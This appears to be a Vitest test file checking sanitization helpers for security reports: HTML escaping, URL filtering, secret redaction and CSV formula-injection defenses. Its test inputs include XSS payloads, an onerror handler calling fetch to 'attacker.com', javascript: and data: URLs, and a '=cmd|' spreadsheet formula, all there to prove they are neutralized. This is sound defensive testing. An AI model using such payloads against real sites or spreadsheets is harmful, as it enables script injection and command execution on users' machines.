import { describe, it, expect } from 'vitest';
import {
  escapeHtml,
  sanitizeUrl,
  redactSensitiveData,
  escapeCsvField,
} from '../../src/main/reports/security.js';

describe('Report Security & Sanitization Utilities', () => {
  describe('HTML Escaping (escapeHtml)', () => {
    it('escapes dangerous HTML characters', () => {
      const malicious = '<script>alert("XSS & \'pwnd\' `test`")</script>';
      const escaped = escapeHtml(malicious);
      expect(escaped).toBe(
        '&lt;script&gt;alert(&quot;XSS &amp; &#39;pwnd&#39; &#96;test&#96;&quot;)&lt;/script&gt;',
      );
      expect(escaped.includes('<')).toBe(false);
      expect(escaped.includes('>')).toBe(false);
      expect(escaped.includes('"')).toBe(false);
      expect(escaped.includes("'")).toBe(false);
      expect(escaped.includes('`')).toBe(false);
    });

    it('handles null, undefined, numbers, and booleans safely', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
      expect(escapeHtml(12345)).toBe('12345');
      expect(escapeHtml(true)).toBe('true');
      expect(escapeHtml(false)).toBe('false');
    });

    it('escapes nested HTML tags in finding descriptions', () => {
      const input = '<img src=x onerror="fetch(\'http://attacker.com\')">';
      const escaped = escapeHtml(input);
      expect(escaped).not.toContain('<img');
      expect(escaped).toContain('&lt;img');
      expect(escaped).toContain('&quot;');
    });
  });

  describe('URL Sanitization (sanitizeUrl)', () => {
    it('allows valid http and https URLs', () => {
      expect(sanitizeUrl('https://example.com/page?id=1')).toBe('https://example.com/page?id=1');
      expect(sanitizeUrl('http://insecure.test/audit')).toBe('http://insecure.test/audit');
    });

    it('rejects javascript: URLs and returns #', () => {
      expect(sanitizeUrl('javascript:alert(1)')).toBe('#');
      expect(sanitizeUrl('JAVASCRIPT:alert(document.cookie)')).toBe('#');
      expect(sanitizeUrl('  javascript:void(0)  ')).toBe('#');
    });

    it('rejects data: and vbscript: URIs', () => {
      expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('#');
      expect(sanitizeUrl('vbscript:msgbox(1)')).toBe('#');
    });

    it('rejects file: URLs to prevent local file exposure', () => {
      expect(sanitizeUrl('file:///C:/Windows/System32/drivers/etc/hosts')).toBe('#');
    });

    it('allows safe relative paths', () => {
      expect(sanitizeUrl('/dashboard/reports')).toBe('/dashboard/reports');
    });

    it('rejects protocol-relative URLs (//attacker.com)', () => {
      expect(sanitizeUrl('//attacker.com/evil')).toBe('#');
    });

    it('returns # for invalid or empty inputs', () => {
      expect(sanitizeUrl('')).toBe('#');
      expect(sanitizeUrl(null)).toBe('#');
      expect(sanitizeUrl(undefined)).toBe('#');
      expect(sanitizeUrl('not a url')).toBe('#');
    });
  });

  describe('Secret Redaction (redactSensitiveData)', () => {
    it('redacts sensitive object keys', () => {
      const data = {
        authorization: 'Bearer secret-token-12345',
        cookie: 'PHPSESSID=abcdef1234567890; admin=1',
        password: 'SuperSecretPassword!',
        token: 'xyz987',
        normalField: 'Public finding information',
      };

      const redacted = redactSensitiveData(data) as Record<string, unknown>;
      expect(redacted.authorization).toBe('[REDACTED_SECRET]');
      expect(redacted.cookie).toBe('[REDACTED_SECRET]');
      expect(redacted.password).toBe('[REDACTED_SECRET]');
      expect(redacted.token).toBe('[REDACTED_SECRET]');
      expect(redacted.normalField).toBe('Public finding information');
    });

    it('redacts Bearer tokens in raw strings', () => {
      const text = 'Authorization header observed: Bearer my-secret-jwt-token-value-here';
      const redacted = redactSensitiveData(text);
      expect(redacted).toBe('Authorization header observed: Bearer [REDACTED_TOKEN]');
    });

    it('redacts JWT tokens in evidence strings', () => {
      const jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
      const text = `Found active JWT in payload: ${jwt}`;
      const redacted = redactSensitiveData(text);
      expect(redacted).not.toContain(jwt);
      expect(redacted).toContain('[REDACTED_JWT]');
    });

    it('redacts private keys in evidence', () => {
      const privKey = '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...\n-----END RSA PRIVATE KEY-----';
      const text = `Private key exposed:\n${privKey}`;
      const redacted = redactSensitiveData(text);
      expect(redacted).not.toContain('MIIEowIBAAKCAQEA0');
      expect(redacted).toContain('[REDACTED_PRIVATE_KEY]');
    });

    it('redacts query string credentials', () => {
      const urlWithCreds = 'https://example.com/api?user=admin&password=TopSecret123&token=abc';
      const redacted = redactSensitiveData(urlWithCreds);
      expect(redacted).toContain('password=[REDACTED]');
      expect(redacted).toContain('token=[REDACTED]');
      expect(redacted).not.toContain('TopSecret123');
    });

    it('redacts local user directory paths', () => {
      const pathWithUser = 'Log saved at C:\\Users\\Administrator\\AppData\\Local\\secret.log';
      const redacted = redactSensitiveData(pathWithUser);
      expect(redacted).not.toContain('Administrator');
      expect(redacted).toContain('C:\\Users\\[REDACTED_USER]\\AppData\\Local\\secret.log');
    });

    it('handles deeply nested structures and arrays', () => {
      const complex = {
        headers: [
          { name: 'Content-Type', value: 'application/json' },
          { name: 'Set-Cookie', value: 'secret-session=123' },
        ],
        details: {
          sub: {
            apiKey: 'AIzaSySecret123',
          },
        },
      };

      const redacted = redactSensitiveData(complex) as any;
      expect(redacted.headers[1].value).toBe('secret-session=123'); // value inside object where name is Set-Cookie
      expect(redacted.details.sub.apiKey).toBe('[REDACTED_SECRET]');
    });
  });

  describe('CSV Escaping & Formula Injection Protection (escapeCsvField)', () => {
    it('escapes standard CSV values with double quotes', () => {
      expect(escapeCsvField('Hello World')).toBe('"Hello World"');
      expect(escapeCsvField('Title with, comma')).toBe('"Title with, comma"');
      expect(escapeCsvField('Line 1\nLine 2')).toBe('"Line 1\nLine 2"');
    });

    it('escapes internal double quotes by doubling them', () => {
      expect(escapeCsvField('He said "hello"')).toBe('"He said ""hello"""');
    });

    it('neutralizes formula injection starting with =', () => {
      const malicious = '=cmd|\'/C calc\'!A0';
      const safe = escapeCsvField(malicious);
      expect(safe.startsWith("\"'=")).toBe(true);
      expect(safe).toBe("\"'=cmd|'/C calc'!A0\"");
    });

    it('neutralizes formula injection starting with +, -, @, Tab, CR', () => {
      expect(escapeCsvField('+12345')).toBe("\"'+12345\"");
      expect(escapeCsvField('-SUM(A1:A10)')).toBe("\"'-SUM(A1:A10)\"");
      expect(escapeCsvField('@SUM(A1:A10)')).toBe("\"'@SUM(A1:A10)\"");
      expect(escapeCsvField('\tcmd')).toBe("\"'\tcmd\"");
      expect(escapeCsvField('\rcmd')).toBe("\"'\rcmd\"");
    });

    it('redacts secrets inside CSV cells', () => {
      const field = 'Authorization: Bearer secret-value-12345';
      const safe = escapeCsvField(field);
      expect(safe).toContain('Bearer [REDACTED_TOKEN]');
      expect(safe).not.toContain('secret-value-12345');
    });
  });
});
